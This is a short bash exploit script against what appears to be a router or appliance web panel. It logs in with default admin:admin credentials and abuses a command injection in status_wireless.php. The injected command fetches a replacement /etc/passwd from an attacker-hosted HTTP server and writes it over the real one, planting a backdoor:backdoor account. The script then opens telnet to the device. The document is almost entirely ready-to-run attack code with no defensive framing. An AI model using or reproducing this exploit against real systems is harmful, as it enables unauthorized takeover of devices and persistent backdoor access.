#!/bin/bash

user=admin
pwd=admin

echo "[~] Authenticating.."
authed_cookie=$(curl -d "user=$user&pwd=$pwd" http://192.168.1.100/login.php -v --silent 2>&1 | grep PHPSESSID | sed 's/=/\n/g'| sed 's/;/\n/g' | sed -n 2p)

if [ -z "$authed_cookie" ]
then
	echo "[!] Authentication failed as \"admin:admin\""
	exit 1
else
	echo "[+] Authenticated as \"admin:admin\""
	echo "[~] Starting HTTP server port 9999"
	python3 -m http.server 9999 > /dev/null 2>/dev//null&
	pid=$!

	echo "[+] Overwriting /etc/passwd file.."
	curl "http://192.168.1.100/status_wireless.php?id=0;cp+%2Fetc%2Fpasswd+%2Fetc%2Fpasswd.bak%3Bcurl+http%3A%2F%2F192.168.1.128:9999%2Fpwned-passwd+-o+%2Fetc%2Fpasswd#" -H "Cookie: PHPSESSID=$authed_cookie" -o /dev/null 2>/dev/null

	kill -9 $pid
	echo "[~] Killed HTTP server"

	echo
	echo "[+] Login with backdoor:backdoor"
	echo

	telnet 192.168.1.100
fi
